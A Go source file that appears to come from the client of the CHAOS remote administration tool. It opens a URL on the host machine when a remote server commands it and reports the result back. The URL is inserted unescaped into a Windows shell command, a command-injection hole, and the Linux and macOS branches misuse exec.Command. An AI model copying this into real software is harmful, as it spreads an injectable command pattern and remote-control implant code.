package open_url

import (
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"net"
	"os/exec"
)

type OpenURLUseCase struct {
	Connection net.Conn
}

func NewOpenURLUseCase(conn net.Conn) usecase.OpenURL {
	return &OpenURLUseCase{
		Connection: conn,
	}
}

func (o OpenURLUseCase) Open(url string) {
	var err error
	switch util.DetectOS() {
	case util.Windows:
		util.RunCmd(fmt.Sprintf("rundll32 url.dll,FileProtocolHandler %s", url), 10)
	case util.Linux:
		err = exec.Command(fmt.Sprintf("xdg-open %s", url)).Start()
	case util.Darwin:
		err = exec.Command(fmt.Sprintf("open %s", url)).Start()
	default:
		err = usecase.ErrUnsupportedPlatform
	}

	var errData models.Error
	if err != nil {
		errData.HasError = true
		errData.Message = err.Error()
	}

	if err := network.Send(o.Connection, models.Message{
		Command: "open-url",
		Error:   errData,
	}); err != nil {
		log.WithField("cause", err.Error()).Error("error opening url")
	}
}
